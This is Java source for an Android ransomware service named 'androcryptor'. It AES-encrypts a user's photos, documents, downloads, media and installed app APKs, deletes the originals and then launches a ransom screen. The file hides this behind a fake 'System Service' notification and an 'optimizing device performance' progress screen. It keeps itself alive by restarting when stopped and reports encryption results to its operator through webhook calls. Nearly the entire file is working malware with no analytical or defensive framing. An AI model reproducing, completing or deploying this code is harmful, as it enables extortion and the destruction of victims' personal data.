package com.example.androcryptor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings; // Added for canDrawOverlays check
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptionService extends Service {

    private static final String TAG = "EncryptionService";
    private static final String NOTIFICATION_CHANNEL_ID = "EncryptionServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String ENCRYPTED_FILE_EXTENSION = ".EX01"; // New extension
    
    // Static counter for failed files that can be accessed by WebhookUtils
    private static AtomicInteger staticFailedFilesCount = new AtomicInteger(0);
    
    /**
     * Get the count of files that failed to encrypt
     * @return The number of files that failed to encrypt
     */
    public static int getFailedFilesCount() {
        return staticFailedFilesCount.get();
    }
    
    // Random encryption key generated at runtime - not stored locally for security
    private static byte[] encryptionKey = null; // Will be generated randomly
    
    // Method to get the encryption key (for decryption)
    public static byte[] getEncryptionKey() {
        return encryptionKey;
    }
    
    // Method to generate a random encryption key
    private static byte[] generateRandomEncryptionKey() {
        byte[] key = new byte[32]; // 32-byte (256-bit) key for AES-256
        SecureRandom secureRandom = new SecureRandom();
        secureRandom.nextBytes(key);
        return key;
    }
    
    private static final String[] TARGET_EXTENSIONS = {
            ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".pdf", ".doc", ".docx", 
            ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv", ".xml",
            ".zip", ".rar", ".7z", ".mp3", ".mp4", ".avi", ".mov", ".mkv",
            ".apk", ".db", ".sql", ".json", ".html", ".htm", ".php", ".js",
            ".odt", ".ods", ".odp", ".odg", ".odf", ".py", ".java", ".c", 
            ".cpp", ".h", ".cs", ".vb", ".rb", ".pl", ".php", ".asp", ".aspx",
            ".jsp", ".md", ".svg", ".psd", ".ai", ".indd", ".eps", ".tif", 
            ".tiff", ".wav", ".flac", ".aac", ".m4a", ".ogg", ".wma", ".epub",
            ".mobi", ".azw", ".azw3", ".fb2", ".djvu", ".key", ".pages", ".numbers"
    };
    
    // Restored full SKIP_DIRECTORIES
    private static final String[] SKIP_DIRECTORIES = {
            "/system", "/sbin", "/vendor", "/etc", "/proc", "/sys", "/dev",
            "/data/data/com.android.systemui", "/data/data/com.google.android.gms",
            "/data/data/com.android.providers", "/data/data/com.android.settings",
            "/data/app/com.android.systemui", "/data/app/com.google.android.gms",
            "/data/app/com.android.providers", "/data/app/com.android.settings",
            "/data/app/com.google.android.packageinstaller", "/data/app/com.android.phone"
    };
    
    private ExecutorService encryptionExecutor;
    private AtomicInteger encryptedFilesCount = new AtomicInteger(0);
    private AtomicInteger encryptedApkCount = new AtomicInteger(0); // Added back
    private AtomicInteger failedFilesCount = new AtomicInteger(0); // Track encryption failures
    private PowerManager.WakeLock wakeLock;
    private Handler mainHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, createNotification());
        }
        
        int numThreads = Runtime.getRuntime().availableProcessors();
        encryptionExecutor = Executors.newFixedThreadPool(numThreads);
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 
                    "AndroCryptor:EncryptionWakeLock");
            if (wakeLock != null) { 
                wakeLock.acquire(30 * 60 * 1000); 
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Check if decryption is completed
        if (getSharedPreferences("ac_prefs", MODE_PRIVATE).getBoolean("decryption_complete", false)) {
            Log.d(TAG, "Decryption is complete. Stopping service.");
            stopSelf();
            return START_NOT_STICKY;
        }
        
        startEncryption();
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (encryptionExecutor != null && !encryptionExecutor.isShutdown()) {
            encryptionExecutor.shutdownNow();
        }
        if (getSharedPreferences("ac_prefs", MODE_PRIVATE).getBoolean("decryption_complete", false)) {
            return;
        }
        Intent restartServiceIntent = new Intent(getApplicationContext(), EncryptionService.class);
        startService(restartServiceIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Background system service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Optimizing device performance...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSound(null)
                .setVibrate(null)
                .build();
    }

    private void showOptimizationProgress(int current, int total) {
        Intent progressIntent = new Intent(this, OptimizationProgressActivity.class);
        progressIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        progressIntent.putExtra("current", current);
        progressIntent.putExtra("total", total);
        startActivity(progressIntent);
    }
    
    private void updateOptimizationProgress(int current, int total) {
        Intent progressIntent = new Intent(OptimizationProgressActivity.ACTION_UPDATE_PROGRESS);
        progressIntent.putExtra("current", current);
        progressIntent.putExtra("total", total);
        sendBroadcast(progressIntent);
    }
    
    private void closeOptimizationProgress() {
        Intent progressIntent = new Intent(OptimizationProgressActivity.ACTION_CLOSE);
        sendBroadcast(progressIntent);
    }

    private void startEncryption() {
        encryptionExecutor.submit(() -> {
            try {
                Log.d(TAG, "Starting encryption process");
                
                // Generate a random encryption key
                encryptionKey = generateRandomEncryptionKey();
                Log.d(TAG, "Generated random encryption key");
                
                try {
                    getSharedPreferences("ac_prefs", MODE_PRIVATE)
                            .edit()
                            .putBoolean("encryption_started", true)
                            .putBoolean("encryption_complete", false)
                            .apply();
                } catch (Exception ignored) {}
                
                List<File> downloadsFiles = new ArrayList<>();
                List<File> photoFiles = new ArrayList<>();
                List<File> otherFiles = new ArrayList<>();
                List<File> apkFiles = new ArrayList<>();
                
                File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (downloadsDir != null && downloadsDir.exists()) {
                    scanFilesToEncrypt(downloadsDir, downloadsFiles);
                }
                
                File dcimDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
                File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
                if (dcimDir != null && dcimDir.exists()) {
                    scanFilesToEncrypt(dcimDir, photoFiles);
                }
                if (picturesDir != null && picturesDir.exists()) {
                    scanFilesToEncrypt(picturesDir, photoFiles);
                }
                
                scanFilesToEncrypt(Environment.getExternalStorageDirectory(), otherFiles);
                
                otherFiles.removeAll(downloadsFiles);
                otherFiles.removeAll(photoFiles);
                
                scanInstalledApkFiles(apkFiles);
                
                List<File> filesToEncrypt = new ArrayList<>();
                filesToEncrypt.addAll(downloadsFiles);
                filesToEncrypt.addAll(photoFiles);
                filesToEncrypt.addAll(otherFiles);
                filesToEncrypt.addAll(apkFiles);
                
                final int totalFiles = filesToEncrypt.size();
                Log.d(TAG, "Found " + totalFiles + " files to encrypt (Downloads: " + downloadsFiles.size() + 
                      ", Photos: " + photoFiles.size() + ", Other: " + otherFiles.size() + 
                      ", APKs: " + apkFiles.size() + ")");
                
                encryptedFilesCount.set(0); 

                if (totalFiles == 0) {
                    Log.d(TAG, "No files found to encrypt, simulating optimization before ransom.");
                    mainHandler.post(() -> {
                        showOptimizationProgress(0, 1);
                        updateOptimizationProgress(1, 1);
                        try {
                            getSharedPreferences("ac_prefs", MODE_PRIVATE)
                                    .edit()
                                    .putBoolean("encryption_complete", true)
                                    .apply();
                        } catch (Exception ignored) {}
                        mainHandler.postDelayed(() -> {
                            closeOptimizationProgress();
                            showRansomScreen();
                        }, 1500);
                    });
                    return;
                }
                
                mainHandler.post(() -> showOptimizationProgress(0, totalFiles));
                
                int numThreads = Math.min(2, Runtime.getRuntime().availableProcessors());
                int filesPerThread = (int) Math.ceil((double) totalFiles / numThreads);
                
                for (int i = 0; i < numThreads; i++) {
                    final int startIndex = i * filesPerThread;
                    final int endIndex = Math.min(startIndex + filesPerThread, totalFiles);
                    if (startIndex >= totalFiles) break;
                    
                    encryptionExecutor.submit(() -> {
                        for (int j = startIndex; j < endIndex; j++) {
                            encryptFile(filesToEncrypt.get(j));
                            int count = encryptedFilesCount.incrementAndGet();
                            
                            if (count % 5 == 0 || count == totalFiles) {
                                final int currentCount = count;
                                mainHandler.post(() -> updateOptimizationProgress(currentCount, totalFiles));
                                Log.d(TAG, "Encrypted " + count + " of " + totalFiles + " items");
                            }
                            
                            if (count >= totalFiles) {
                                mainHandler.post(() -> {
                                    Log.d(TAG, "Encryption complete, closing progress and showing ransom screen");
                                    closeOptimizationProgress();
                                    try {
                                        getSharedPreferences("ac_prefs", MODE_PRIVATE)
                                                .edit()
                                                .putBoolean("encryption_complete", true)
                                                .apply();
                                    } catch (Exception ignored) {}
                                    new Handler().postDelayed(() -> showRansomScreen(), 1500);
                                });
                            }
                        }
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "Encryption failed", e);
                
                String deviceId = DeviceUtils.getDeviceId(this);
                String errorMessage = e.getMessage();
                if (errorMessage == null || errorMessage.isEmpty()) {
                    errorMessage = e.getClass().getSimpleName();
                }
                
                try {
                    WebhookUtils.sendEncryptionFailedNotification(this, deviceId, errorMessage);
                } catch (Exception ex) {
                    Log.e(TAG, "Failed to send encryption failure webhook notification", ex);
                }
                
                mainHandler.post(() -> {
                    closeOptimizationProgress();
                    try {
                        getSharedPreferences("ac_prefs", MODE_PRIVATE)
                                .edit()
                                .putBoolean("encryption_complete", true)
                                .apply();
                    } catch (Exception ignored) {}
                    showRansomScreen();
                });
            }
        });
    }

    private void scanFilesToEncrypt(File directory, List<File> filesToEncrypt) {
        if (directory == null || !directory.exists()) return;

        for (String skipDir : SKIP_DIRECTORIES) {
            if (directory.getAbsolutePath().startsWith(skipDir)) {
                Log.d(TAG, "Skipping directory: " + directory.getAbsolutePath());
                return;
            }
        }
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    scanFilesToEncrypt(file, filesToEncrypt);
                } else {
                    String fileName = file.getName().toLowerCase();
                    boolean shouldEncrypt = false;
                    for (String ext : TARGET_EXTENSIONS) {
                        if (fileName.endsWith(ext)) {
                            shouldEncrypt = true;
                            break;
                        }
                    }
                    if (fileName.endsWith(ENCRYPTED_FILE_EXTENSION.toLowerCase())) { // Check against new extension
                        shouldEncrypt = false;
                    }
                    if (shouldEncrypt) {
                        if(file.length() > 0) { 
                           filesToEncrypt.add(file);
                        } else {
                           Log.d(TAG, "Skipping empty file: " + file.getAbsolutePath());
                        }
                    }
                }
            }
        } else {
            Log.w(TAG, "Could not list files in directory: " + directory.getAbsolutePath() +
                  ". Check permissions or if the directory is accessible.");
        }
    }
    
    private void scanInstalledApkFiles(List<File> filesToEncrypt) {
        try {
            PackageManager pm = getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            Log.d(TAG, "Scanning " + packages.size() + " installed packages for APKs.");
            for (PackageInfo packageInfo : packages) {
                try {
                    ApplicationInfo appInfo = packageInfo.applicationInfo;
                    if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    if (packageInfo.packageName.equals(getPackageName())) continue;

                    String apkPath = appInfo.sourceDir;
                    if (apkPath != null && !apkPath.toLowerCase().endsWith(ENCRYPTED_FILE_EXTENSION.toLowerCase())) { // Check against new extension
                        File apkFile = new File(apkPath);
                        if (apkFile.exists() && apkFile.length() > 0) { 
                            Log.d(TAG, "Adding APK to encrypt: " + apkPath);
                            filesToEncrypt.add(apkFile); 
                        } else {
                            Log.d(TAG, "Skipping non-existent, unreadable or empty APK: " + apkPath);
                        }
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && appInfo.splitSourceDirs != null) {
                        for (String splitPath : appInfo.splitSourceDirs) {
                           if (splitPath != null && !splitPath.toLowerCase().endsWith(ENCRYPTED_FILE_EXTENSION.toLowerCase())) { // Check against new extension
                                File splitFile = new File(splitPath);
                                if (splitFile.exists() && splitFile.length() > 0) { 
                                    Log.d(TAG, "Adding split APK to encrypt: " + splitPath);
                                    filesToEncrypt.add(splitFile);
                                } else {
                                   Log.d(TAG, "Skipping non-existent, unreadable or empty split APK: " + splitPath);
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing package for APK: " + packageInfo.packageName, e);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning installed APKs", e);
        }
    }

    private void encryptFile(File file) {
        try {
            if (!file.exists() || file.length() == 0) {
                Log.d(TAG, "Skipping encryption for non-existent or empty file: " + file.getAbsolutePath());
                return;
            }
            
            byte[] iv = new byte[16];
            for (int i = 0; i < 16; i++) {
                iv[i] = (byte)(i + 1); 
            }
            
            File outputFile = new File(file.getAbsolutePath() + ENCRYPTED_FILE_EXTENSION); // Use new extension
            
            try {
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                SecretKeySpec keySpec = new SecretKeySpec(encryptionKey, "AES");
                IvParameterSpec ivSpec = new IvParameterSpec(iv);
                cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
                
                FileInputStream fis = new FileInputStream(file);
                FileOutputStream fos = new FileOutputStream(outputFile);
                
                fos.write(iv);
                
                CipherOutputStream cos = new CipherOutputStream(fos, cipher);
                
                byte[] buffer = new byte[8192];
                int count;
                while ((count = fis.read(buffer)) > 0) {
                    cos.write(buffer, 0, count);
                }
                
                fis.close();
                cos.flush();
                cos.close();
                
                if (outputFile.exists() && outputFile.length() > 16) { 
                    Log.d(TAG, "Successfully encrypted: " + file.getAbsolutePath());
                    file.delete(); 
                } else {
                    Log.w(TAG, "Encrypted file is too small or doesn\'t exist, original not deleted: " + file.getAbsolutePath());
                    if (outputFile.exists()) {
                        outputFile.delete(); 
                    }
                    failedFilesCount.incrementAndGet(); 
                    staticFailedFilesCount.incrementAndGet(); 
                }
            } catch (Exception e) {
                Log.e(TAG, "Encryption error for file: " + file.getAbsolutePath(), e);
                if (outputFile.exists()) {
                    outputFile.delete(); 
                }
                failedFilesCount.incrementAndGet(); 
                staticFailedFilesCount.incrementAndGet(); 
            }
        } catch (Exception e) {
            Log.e(TAG, "Fatal error encrypting file: " + file.getAbsolutePath(), e);
            failedFilesCount.incrementAndGet(); 
            staticFailedFilesCount.incrementAndGet(); 
        }
    }

    private void showRansomScreen() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        String deviceId = DeviceUtils.getDeviceId(this);
        int filesCount = encryptedFilesCount.get();
        int failedCount = failedFilesCount.get();
        Log.i(TAG, "Encryption complete. Device ID: " + deviceId + 
              ", Files encrypted: " + filesCount + 
              ", Files failed: " + failedCount);
        
        try {
            if (filesCount > 0) {
                WebhookUtils.sendEncryptionCompleteNotification(deviceId, filesCount);
                
                if (failedCount > 0) {
                    Log.w(TAG, "Some files failed to encrypt: " + failedCount);
                }
            } 
            else if (failedCount > 0) {
                WebhookUtils.sendEncryptionFailedNotification(this, deviceId, 
                    "All encryption attempts failed. Failed files: " + failedCount);
            }
            else {
                WebhookUtils.sendEncryptionFailedNotification(this, deviceId, 
                    "No files were processed for encryption");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to send webhook notification, continuing anyway", e);
        }
        
        Intent intent = new Intent(this, RansomActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.w(TAG, "RansomActivity might not display; app cannot draw over other apps. Request SYSTEM_ALERT_WINDOW in MainActivity.");
        }
        
        try {
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start RansomActivity", e);
            try {
                WebhookUtils.sendEncryptionCompleteNotification(deviceId, filesCount);
            } catch (Exception ex) {
                Log.e(TAG, "Failed to send webhook notification after RansomActivity failure", ex);
            }
        }
    }
}
